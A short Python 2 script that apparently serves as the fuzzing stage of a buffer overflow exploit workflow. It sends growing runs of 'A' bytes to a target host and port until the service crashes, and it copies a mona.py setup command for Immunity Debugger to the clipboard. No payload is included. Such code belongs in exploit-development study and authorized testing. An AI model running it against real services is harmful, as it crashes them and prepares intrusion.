import socket
import sys
from constants import *
import pyperclip

buffer = ["A"]
counter = 100

cmd = "!mona config -set workingfolder c:\mona\%p"
print "\n\n\nRun in Immunity (copied to clipboard): %s" % cmd
pyperclip.copy(cmd)
print "\nPaste the buffer length that causes crash into constants.py as BUFFER_TOTLEN"

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter = counter + 200

try:
  for string in buffer:
      print "fuzzing %s bytes" % len(string)
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
      send_payload(s, string)
except:
  print "connection lost at %s bytes" % len(string)
